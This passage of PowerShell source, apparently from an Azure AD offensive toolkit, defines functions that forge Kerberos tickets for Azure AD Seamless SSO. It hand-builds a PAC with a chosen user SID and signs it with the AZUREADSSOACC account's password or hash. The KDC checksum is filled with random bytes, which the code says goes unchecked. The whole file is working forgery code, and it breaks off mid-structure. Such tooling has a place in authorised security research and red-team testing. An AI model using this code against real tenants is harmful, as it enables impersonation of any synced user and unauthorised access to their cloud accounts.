# Generates PAC for the kerberos ticket
# Aug 8th 2019
Function New-PAC
{
    
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$UserName,
        [Parameter(Mandatory=$False)]
        [String]$UserDisplayName,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName,
        [Parameter(Mandatory=$True)]
        [String]$ServerName,
        [Parameter(Mandatory=$True)]
        [String]$DomainName,
        [Parameter(Mandatory=$True)]
        [String]$DomainDNSName,
        [Parameter(Mandatory=$True)]
        [Byte[]]$Sid,
        [Parameter(Mandatory=$False)]
        [String]$Password,
        [Parameter(Mandatory=$False)]
        [String]$Hash,
        [Parameter(Mandatory=$True)]
        [DateTime]$AuthTime,
        [Parameter(Mandatory=$False)]
        [Int]$SequenceNumber=([System.Random]::new()).Next(),

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec
        [Parameter(Mandatory=$False)]
        [Int]$UserAccountControl=0x00000080 # USER_WORKSTATION_TRUST_ACCOUNT #0x00000010 <# USER_NORMAL_ACCOUNT #> -bor 0X00000200 <# USER_DONT_EXPIRE_PASSWORD #> 
    )
    
    Process
    {
        # Set the timestamps
        $DeviceId =           $authTime                     # MUST be same than authTime
        $LogonTime =          $DeviceId.AddMinutes(-10)     # We've logged in 10 minutes ago :)
        $PwdLastChangeTime =  (Get-Date).AddDays(-10)       # We've changed our password 10 days ago,
        $PwdCanChangeTime =   $PwdLastChangeTime.AddDays(1) # so we could've changed it 9 days ago

        # Convert names to Unicode byte strings
        $bDomainName =        [system.text.encoding]::unicode.GetBytes(       $DomainName)
        $bUserName =          [system.text.encoding]::unicode.GetBytes(         $UserName) 
        $bUserDisplayName =   [system.text.encoding]::unicode.GetBytes(  $UserDisplayName)
        $bServerName =        [system.text.encoding]::unicode.GetBytes(       $ServerName)
        $bDomainDNSName =     [system.text.encoding]::unicode.GetBytes(    $DomainDNSName)
        $bUserPrincipalName = [system.text.encoding]::unicode.GetBytes($UserPrincipalName)

        # Extract the user and domain sids
        $bUserSid = $Sid[24..27]
        $bDomainSid = $Sid[0..23]
        $bDomainSid[1]=4 # Need to change from 5 to 4

        # Construct the PACs
        $LOGON_INFORMATION=[byte[]]@(    
            @(0x01)                   # Version = 0x01
            @(0x10)                   # Endianness (=little endian)
            @(0x08, 0x00)             # Length = 0x08
            @(0xCC, 0xCC, 0xCC, 0xCC) # Filler
            @(0x00, 0x00, 0x00, 0x00) # Length of the info buffer (placeholder)
            @(0x00, 0x00, 0x00, 0x00) # Zeros
            
            @(0x00, 0x00, 0x02, 0x00) # User info pointer

            [System.BitConverter]::GetBytes($LogonTime.ToFileTimeUtc())         # LogonTime 
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # LogOffTime 
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # KickOffTime 
            [System.BitConverter]::GetBytes($PwdLastChangeTime.ToFileTimeUtc()) # PwdLastChangeTime
            [System.BitConverter]::GetBytes($PwdCanChangeTime.ToFileTimeUtc())  # PwdCanChangeTime
            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # PwdMustChangeTime
            # UserName
                [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Length
                [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Max length
                @(0x04, 0x00, 0x02, 0x00)                                   # Pointer
            # UserDisplayName
                [System.BitConverter]::GetBytes([int16]($bUserDisplayName.Length)) # Length
                [System.BitConverter]::GetBytes([int16]($bUserDisplayName.Length)) # Max Length
                @(0x08, 0x00, 0x02, 0x00)                                          # Pointer
            # LogonScript
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x0C, 0x00, 0x02, 0x00) # Pointer
            # ProfilePath
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x10, 0x00, 0x02, 0x00) # Pointer
            # HomeDirectory
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x14, 0x00, 0x02, 0x00) # Pointer
            # HomeDrive    
                @(0x00, 0x00)             # Length
                @(0x00, 0x00)             # Max Length
                @(0x18, 0x00, 0x02, 0x00) # Pointer
            
            @(0x05, 0x00) # LogonCount -- just add something..
            @(0x00, 0x00) # BadPasswordCount

            
            $bUserSid                 # UserSid
            [System.BitConverter]::GetBytes([int32](513)) # GroupSid:
                                                          # https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups
                                                          # 0x0200 = 512 = Domain Admins
                                                          # 0x0201 = 513 = Domain Users
                                                          # 0x0202 = 514 = Domain Guests
                                                          # 0x0203 = 515 = Domain Computers
                                                          # 0x0204 = 516 = Domain Controllers
                                                          # 0x0207 = 519 = Enterprise Admins
                                                          # 0x020f = 527 = Key Admins
                                                          # 0x0220 = 544 = Local Admins
            @(0x02, 0x00, 0x00, 0x00) # GroupCount
            @(0x1C, 0x00, 0x02, 0x00) # GroupPointer
    
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73
            @(0x20, 0x00, 0x00, 0x00) # UserFlags
                                      # 0x 20 = ExtraSid is populated and contains additional SIDs
                                      # 0x200 = ResourceGroupIds field is populated.
    
            # UserSessionKey - used only for NTLM
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    
            # ServerName
                [System.BitConverter]::GetBytes([int16]($bServerName.Length))   # Length
                [System.BitConverter]::GetBytes([int16]($bServerName.Length+2)) # MaxLength -- Why + 2 for the size??
                @(0x20, 0x00, 0x02, 0x00)                                       # Pointer
            # DomainName
                [System.BitConverter]::GetBytes([int16]($bDomainName.Length))   # Length
                [System.BitConverter]::GetBytes([int16]($bDomainName.Length+2)) # MaxLength
                @(0x24, 0x00, 0x02, 0x00)                                       # Pointer
            
            @(0x28, 0x00, 0x02, 0x00)                                   # DomainIDPointer
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # Reserved = 8 x 0x00
            [System.BitConverter]::GetBytes([int32]$UserAccountControl) # UserAccountControl 
            @(0x00, 0x00, 0x00, 0x00)                                   # SubAuthStatus
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastSuccessfullLogon
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastFailedLogon
            @(0x00, 0x00, 0x00, 0x00)                                   # Failed Logon Count

            @(0x00, 0x00, 0x00, 0x00) # Reserved
            @(0x01, 0x00, 0x00, 0x00) # ExtraSidCount
            @(0x2C, 0x00, 0x02, 0x00) # ExtraSidPointer
                
            @(0x00, 0x00, 0x00, 0x00) # ResourceDomainIdPointer
            @(0x00, 0x00, 0x00, 0x00) # ResourceGroupCount
            @(0x00, 0x00, 0x00, 0x00) # ResourceGroupPointer
    
        # STRINGS
            # UserName
                [System.BitConverter]::GetBytes([int32]($bUserName.Length)/2) # Total = maxlength / 2
                @(0x00, 0x00, 0x00, 0x00)                                     # Unused
                [System.BitConverter]::GetBytes([int32]($bUserName.Length)/2) # used  = maxlength / 2
                $bUserName

            if($bUserName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
        
            # UserDisplayName
                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Total
                @(0x00, 0x00, 0x00, 0x00)                                            # Unused
                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Used
                if($bUserDisplayName.Length -gt 0){$bUserDisplayName}

            if($bUserDisplayName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
            
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # LogonScript
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # ProfilePath
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # HomeDirectory
            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # HomeDrive
    
            # GroupSids     
                @(0x02, 0x00, 0x00, 0x00)                         # Count
                @(0x03, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 
                @(0x0F, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 

            # ServerName
                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2+1) # Total
                @(0x00, 0x00, 0x00, 0x00) # Unused
                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2)   # Length
                $bServerName

                if($bServerName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
             # DomainName
                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2+1) # Total
                @(0x00, 0x00, 0x00, 0x00)                                         
                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2)   # Length
                $bDomainName 
                if($bDomainName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized

            # DomainSid
                @(0x04, 0x00, 0x00, 0x00) # Count
                $bDomainSid               # SidBytes
            # ExtraSid
                @(0x01, 0x00, 0x00, 0x00) # Count
                @(0x30, 0x00, 0x02, 0x00) # Pointer
                @(0x07, 0x00, 0x00, 0x00) # Attributes
                @(0x01, 0x00, 0x00, 0x00) # SidSize (count)
                @(0x01, 0x01, 0x00, 0x00, # Sid
                  0x00, 0x00, 0x00, 0x12, 
                  0x01, 0x00, 0x00, 0x00) 
        )
        # Set the correct size: Total size - the header
        $size = $LOGON_INFORMATION.Count - 16 # 
        [Array]::Copy([bitconverter]::GetBytes([Int32]$size),0, $LOGON_INFORMATION, 8, 4)

        $CLIENT_NAME_TICKET_INFO=@(
            [System.BitConverter]::GetBytes($DeviceId.ToFileTime())     # ClientId - MUST be equal to authTime
            [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Name Length
            $bUserName
        )
        $UPN_DOMAIN_INFO=@(
            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length))      # UpnLength
            [System.BitConverter]::GetBytes([int16]0x10)                              # UpnOffset 
            [System.BitConverter]::GetBytes([int16]($bDomainDNSName.Length))          # DnsDomainNameLength
            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length+0x10)) # DnsDomainNameOffset 
    
            @(0x00, 0x00, 0x00, 0x00) # Flags
            @(0x00, 0x00, 0x00, 0x00) # Some align thing?
            $bUserPrincipalName       # UPN
            $bDomainDNSName           # DNS Domain
        )
        $SERVER_CHECKSUM=@(
            @(0x76, 0xFF, 0xFF, 0xFF) # Type = KERB_CHECKSUM_HMAC_MD5
            @(0x00, 0x00, 0x00, 0x00, # Server checksum - MUST be 0x00 to calculate checksum
              0x00, 0x00, 0x00, 0x00, 
              0x00, 0x00, 0x00, 0x00, 
              0x00, 0x00, 0x00, 0x00)
        )
        $PRIVILEGE_SERVER_CHECKSUM=@(
            @(0x10, 0x00, 0x00, 0x00) # Type = HMAC_SHA1_96_AES256
            @(0x00, 0x00, 0x00, 0x00, # KDC checksum - MUST be 0x00 to calculate (server) checksum
              0x00, 0x00, 0x00, 0x00, # Otherwise this is not needed nor used
              0x00, 0x00, 0x00, 0x00)
        )


        # Construct the header
        $Offset = 88

        $HEADER = @()

        # Align the blocks
        $logon_info_size =      Align-Size -Size $LOGON_INFORMATION.Length         -Mask 8
        $client_info_size =     Align-Size -Size $CLIENT_NAME_TICKET_INFO.Length   -Mask 8
        $upn_info_size =        Align-Size -Size $UPN_DOMAIN_INFO.Length           -Mask 8
        $server_check_size =    Align-Size -Size $SERVER_CHECKSUM.Length           -Mask 8 
        $privilege_check_size = Align-Size -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8

        $HEADER += @(0x05, 0x00, 0x00, 0x00) # Pac count = 5
        $HEADER += @(0x00, 0x00, 0x00, 0x00) # Version = 0

        $HEADER += @(0x01, 0x00, 0x00, 0x00)                                 # LOGON INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$logon_info_size)  # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$logon_info_size

        $HEADER += @(0x0A,  0x00,  0x00,  0x00)                              # CLIENT_NAME_TICKET_INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$client_info_size) # Size
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$client_info_size

        $HEADER += @(0x0C,  0x00,  0x00,  0x00)                              # UPN_DOMAIN_INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$upn_info_size)    # Size
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$upn_info_size
    
        $HEADER += @(0x06,  0x00,  0x00,  0x00)                                 # SERVER_CHECKSUM
        $HEADER += [System.BitConverter]::GetBytes([int32]$server_check_size-4) # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)              # Offset 
        $Offset+=$server_check_size
    
        $HEADER += @(0x07,  0x00,  0x00,  0x00)                                  # PRIVILEGE_SERVER_CHECKSUM
        $HEADER += [System.BitConverter]::GetBytes([int32]$privilege_check_size) # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)               # Offset
        

        # Construct the PAC
        $PAC=@()

        $PAC += $HEADER
        $PAC += $LOGON_INFORMATION
        $PAC += Get-AlignBytes -Size $LOGON_INFORMATION.Length -Mask 8
        $PAC += $CLIENT_NAME_TICKET_INFO
        $PAC += Get-AlignBytes -Size $CLIENT_NAME_TICKET_INFO.Length -Mask 8
        $PAC += $UPN_DOMAIN_INFO 
        $PAC += Get-AlignBytes -Size $UPN_DOMAIN_INFO.Length -Mask 8
        $PAC +=  $SERVER_CHECKSUM          # KERB_CHECKSUM_HMAC_MD5
        $PAC += Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8
        $PAC += $PRIVILEGE_SERVER_CHECKSUM #HMAC_SHA1_96_AES256
        $PAC += Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8
        
        # Convert the password to MD4 hash
        if([string]::IsNullOrEmpty($Hash))
        {
            $checksum_key = Get-MD4 -String $Password -AsByteArray
        }
        else
        {
            $checksum_key = Convert-HexToByteArray -HexString $Hash
        }
        # Checksums
        $serverChecksum = Get-ServerSignature -Key $checksum_key -Data $PAC
        $KDCChecksum =    Get-RandomBytes -Bytes 12 # Not checked by the server, so random checksum will do

        # Create the signature block - Only server block gets validated in the server
        $signatureBlock = @(
            @(0x76, 0xFF, 0xFF, 0xFF) # Type = KERB_CHECKSUM_HMAC_MD5
            $serverChecksum
            (Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8)
            @(0x10, 0x00, 0x00, 0x00)       # Type = HMAC_SHA1_96_AES256
            $KDCChecksum
            (Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8)
        )

        # Add signature block to the end of the PAC
        $PAC=$PAC[0..($PAC.Length - $signatureBlock.Length-1)] + $signatureBlock

        # Return
        return [byte[]]$PAC
    }
}


# Aug 26th 2019
# Generates a kerberos token to be used with Azure AD Desktop SSO (aka Seamless SSO)
Function New-KerberosTicket
{
    <#
    .SYNOPSIS
    Generates a kerberos token to be used with Azure AD Desktop SSO

    .DESCRIPTION
    Generates a kerberos token to be used with Azure AD Desktop SSO, also known as Seamless SSO.
    Azure AD does only care about user's sid, so no other information needs to be given.

    .Parameter Sid
    User's sid as a byte array

    .Parameter ADUserPrincipalName
    User's principal name. Used to find user from Active Directory to get the SID

    .Parameter AADUserPrincipalName
    User's principal name. Used to find user from Azure Active Directory to get the SID

    .Parameter AccessToken
    Access Token of the user accessing Azure Active Directory to find the given user to get the SID

    .Parameter Password
    Password of the AZUREADSSOACC computer account

    .Parameter Hash
    MD4 hash of the AZUREADSSOACC computer account

    .Example
    PS C:\>Get-AADIntKerberosTicket -Password "MyPassword" -Sid $sid

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-AADIntKerberosTicket -Hash @(0,4,234) -Sid $sid

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-AADIntKerberosTicket -Password "MyPassword" -SidString "S-1-5-21-854568531-3289094026-2628502219-1111"

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-AADIntKerberosTicket -Password "MyPassword" -ADUserPricipalName "user@company.com"
    WARNING: SID not given, trying to find user from the Active Directory

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    PS C:\>Get-AADIntKerberosTicket -Password "MyPassword" -ADUserPricipalName "user@company.com"
    WARNING: SID not given, trying to find user from the Azure Active Directory.
    WARNING: This may take some time, so it would be better to save the AAD objects to
    WARNING: a variable using Get-AADIntSyncObjects and parse SID manually.

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==
    
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='Sid',Mandatory=$True)]
        [Byte[]]$Sid,
        [Parameter(ParameterSetName='SidString',Mandatory=$True)]
        [String]$SidString,
        [Parameter(ParameterSetName='ADupn',Mandatory=$True)]
        [String]$ADUserPrincipalName,
        [Parameter(ParameterSetName='AADupn',Mandatory=$True)]
        [String]$AADUserPrincipalName,
        [Parameter(ParameterSetName='AADupn',Mandatory=$True)]
        [String]$AccessToken,
        [Parameter(Mandatory=$False)]
        [String]$Password,
        [Parameter(Mandatory=$False)]
        [String]$Hash,
        [Parameter(Mandatory=$False)]
        [byte[]]$SessionKey=(New-Guid).ToByteArray(),


        [Parameter(Mandatory=$False)]
        [String]$UserName=          "UserName",
        [Parameter(Mandatory=$False)]
        [String]$UserDisplayName=   "DisplayName",
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName= "UserName@company.com",
        [Parameter(Mandatory=$False)]
        [String]$ServerName=        "DC1.company.com",
        [Parameter(Mandatory=$False)]
        [String]$DomainName=        "COMPANY",
        [Parameter(Mandatory=$False)]
        [String]$Realm=             "COMPANY.COM",
        [Parameter(Mandatory=$False)]
        [String]$ServiceTarget = "HTTP/autologon.microsoftazuread-sso.com",

        [Parameter(Mandatory=$False)]
        [ValidateSet('RC4','AES')]
        [String]$Crypto="RC4",

        [Parameter(Mandatory=$False)]
        [String]$Salt,

        [Parameter(Mandatory=$False)]
        [Int]$SequenceNumber=([System.Random]::new()).Next()

    )
    Process
    {
        # Hash or password must be given!
        if([string]::IsNullOrEmpty($Password) -and $Hash -eq $null)
        {
            Throw "Password or hash must be given!"
        }

        if(![string]::IsNullOrEmpty($Salt))
        {
            $AESSalt = [text.encoding]::UTF8.getBytes($Salt)
        }

        if($Crypto -eq "AES" -and $AESSalt -eq $null)
        {
            Throw "Salt needed for AES encrypted Kerberos ticket!"
        }

        # Got ADUserPrincipalName so we need to try to find SID from AD
        if(![String]::IsNullOrEmpty($ADUserPrincipalName))
        {
            Write-Verbose "SID not given, trying to find user from the Active Directory"
            try
            {
                $User=Get-Sids -UserPrincipalName $ADUserPrincipalName
                if($user -eq $null)
                {
                    return
                }
                $sidObject = [System.Security.Principal.SecurityIdentifier]$user.Sid
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose "$([byte[]]$Sid | Format-Hex)"
            }
            catch
            {
                Write-Error "Couldn't find the user: $($_.Exception)"
                return
            }
        }
        # Got AADUserPrincipalName so we need to try to find SID from Azure AD
        elseif(![String]::IsNullOrEmpty($AADUserPrincipalName))
        {
            Write-Verbose "SID not given, trying to find user from the Azure Active Directory."
            try
            {
                $User=Get-Sids -AccessToken $AccessToken -UserPrincipalName $AADUserPrincipalName
                if($user -eq $null)
                {
                    return
                }
                $sidObject = [System.Security.Principal.SecurityIdentifier]$user.Sid
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose "$([byte[]]$Sid | Format-Hex)"

            }
            catch
            {
                Write-Error "Couldn't find the user: $($_.Exception)"
                return
            }
        }
        # Got SidString so try to convert it
        elseif(![String]::IsNullOrEmpty($SidString))
        {
            try
            {
                Write-Verbose "Got SidString: $SidString"
                $sidObject = [System.Security.Principal.SecurityIdentifier]$SidString
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose (Convert-ByteArrayToHex -Bytes $Sid)
            }
            catch
            {
                Write-Error "Couldn't convert `"$SidString`" to SID: $($_.Exception)"
                return
            }
        }

        # KRB_AP_REQ
        # Set the times
        
        $authTime = Get-Date -Millisecond 0
        $authTime.AddSeconds(-43) | Out-Null # Authentication time should be (a little) in the past
        $startTime = $authTime #.AddSeconds(7)
        $endTime = $authTime.AddHours(10)
        $renewTime = $authTime.AddDays(7)
        $cTime = Get-Date
        

        $machineId =  Get-RandomBytes -Bytes 32
        $kerbLocal1 = Get-RandomBytes -Bytes 16
        $kerbLocal2 = Get-RandomBytes -Bytes 16

        # The ticket
        $ticket=Add-DERTag -Tag 0x63 -Data @(
            Add-DERSequence -Data @(
            Add-DERTag -Tag 0xA0 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x40, 0xA1, 0x00, 0x00)) #Flags 100 0000 1010 0001 old
            # Encryption key                                                                                100 0000 0010 0001 new
            Add-DERTag -Tag 0xA1 -Data @(
                Add-DERSequence -Data @(
                    if($Crypto -eq "RC4")
                    {
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                    }
                    elseif($Crypto -eq "AES")
                    {
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                    }
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data $SessionKey # Session key
                    )
                )
            )
            # Realm
            Add-DERTag -Tag 0xA2 -Data @(Add-DERUtf8String($Realm))
            Add-DERTag -Tag 0xA3 -Data @( # CName
                Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # NT_PRINCIPAL
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERSequence -Data @(Add-DERUtf8String($UserName))
                    )
                )
            )
            Add-DERTag -Tag 0xA4 -Data @(
                Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -data @(Add-DERInteger -Data @(0x01))
                    Add-DERTag -Tag 0xA1 -Data @(0x04,0x00) # Empty octect string: CAddr
                )
            )
            
            Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date $authTime) # Generalized time: AuthTime
            Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date $startTime) # Generalized time: StartTime
            Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date $endTime) # Generalized time: EndTime
            Add-DERTag -Tag 0xA8 -Data @(Add-DERDate -Date $renewTime) # Generalized time: RenewTill
            Add-DERTag -Tag 0xAA -Data @(
                Add-DERSequence -Data @(
                    Add-DERSequence -Data @(

                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # ADIfRelevant
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data @(
                            Add-DERSequence -Data @(
                                Add-DERSequence -Data @(
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80)) # PAC type = AdWin2kPac
                                    Add-DERTag -Tag 0xA1 -Data @(
                                    
                                        Add-DERTag -Tag 0x04 -Data @(
                                            # Generate PAC
                                            [byte[]](New-Pac -UserName $UserName -UserDisplayName $UserDisplayName -UserPrincipalName $UserPrincipalName -ServerName $ServerName -DomainName $DomainName -DomainDNSName $Realm -Sid $Sid -Password $Password -Hash $Hash -AuthTime $authTime -SequenceNumber $SequenceNumber)) 
                                    )
                                )
                            )
                            
                        )
                    )
                )
                    Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) 
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data @(

                            Add-DERSequence -Data @(
                                Add-DERSequence -Data @( 
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D)) # KERB_AUTH_DATA_TOKEN_RESTRICTIONS
                                    Add-DERTag -Tag 0xA1 -Data @( 
                                        Add-DERTag -Tag 0x04 -Data @( # Octet string
                                            Add-DERSequence -Data @(
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) # Restrictiontype, must be 0x00
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            # Flags
                                                            @(0x00, 0x00, 0x00, 0x00)  # Full token
                                                            #@(0x01, 0x00, 0x00, 0x00) # UAC restricted token
                                                            # Integritylevel
                                                            # @(0x00, 0x00, 0x00, 0x00) # Untrusted
                                                            @(0x00, 0x10, 0x00, 0x00)   # Low
                                                            # @(0x00, 0x20, 0x00, 0x00) # Medium
                                                            # @(0x00, 0x30, 0x00, 0x00) # High
                                                            # @(0x00, 0x40, 0x00, 0x00) # System
                                                            # @(0x00, 0x50, 0x00, 0x00) # Protected processes
                                                            # Machine Id
                                                            $machineId
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    )

                                )
                            
                                Add-DERSequence -Data @(
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                    # KerbLocal
                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal1)
                                )
                                
                            )
                            
                        )
                    )
                )
                )
            )
        )
        )
        $encryptionKey = New-KerberosKey -Password $Password -Hash $Hash -Crypto $Crypto
        $encryptedTicket = Encrypt-Kerberos -Data $ticket -Type Ticket -Salt $AESSalt -Crypto $Crypto -Key $encryptionKey
    
        $authenticator=Add-DERTag -Tag 0x62 -Data @(
            Add-DERSequence -Data @(
                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05))
                Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm -Tag 0x1B)
                Add-DERTag -Tag 0xA2 -Data @(
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                        Add-DERTag -Tag 0xa1 -Data @(
                            Add-DERSequence -Data @(
                                Add-DERUtf8String -Text $UserName -Tag 0x1B
                            )
                        )
                    )
                )
                Add-DERTag -Tag 0xA3 -Data @(
                    # Authenticator checksum
                    # https://tools.ietf.org/html/rfc4121#page-6
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80, 0x03)) # Checksum type 32771 = KRBv5
                        # Checksum https://tools.ietf.org/html/rfc4121#section-4.1.1
                        Add-DERTag -Tag 0xA1 -Data @(
                            Add-DERTag -Tag 0x04 -Data @(
                                # Length = 0x10 = 16
                                @(0x10, 0x00, 0x00, 0x00)
                                # Binding information
                                @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
                                
                                # Flags
                                # https://tools.ietf.org/html/rfc2744
                                # GSS_C_DELEG_FLAG            0x01       1
                                # GSS_C_MUTUAL_FLAG           0x02       2
                                # GSS_C_REPLAY_FLAG           0x04       4
                                # GSS_C_SEQUENCE_FLAG         0x08       8
                                # GSS_C_CONF_FLAG             0x10      16
                                # GSS_C_INTEG_FLAG            0x20      32
                                # GSS_C_ANON_FLAG             0x40      64
                                # GSS_C_PROT_READY_FLAG       0x80     128

                                # GSS_C_TRANS_FLAG           0x100     256

                                # GSS_C_DCE_STYLE           0x1000    4096
                                # GSS_C_IDENTIFY_FLAG       0x2000    8192
                                # GSS_C_EXTENDED_ERROR_FLAG 0x4000   16384
                                # GSS_C_DELEG_POLICY_FLAG   0x8000   32768

                                @(0x3E, 0x20, 0x00, 0x00)

                                
                            )
                        )
                    )
                )
                Add-DERTag -Tag 0xA4 -Data @(Add-DERInteger -Data (0x01)) # Cusec = milliseconds part of authTime -- for replay detection, so can be anything
                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate    -Date $cTime) # CTime

                
                Add-DERTag -Tag 0xA6 -Data @(
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # Subkey - not used here to anything
                        Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data (New-Guid).ToByteArray())
                    )
                )
                Add-DERTag -Tag 0xA7 -Data @(Add-DERInteger -Data @([System.BitConverter]::GetBytes($SequenceNumber)) ) # Sequence number
                
                Add-DERTag -Tag 0xA8 -Data @(
                        Add-DERSequence -Data @(
                            Add-DERSequence -Data @(
                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                                Add-DERTag -Tag 0xA1 -Data @(
                                    Add-DERTag -Tag 0x04 -Data @(
                                        Add-DERSequence -Data @(
                                                Add-DERSequence -Data @(
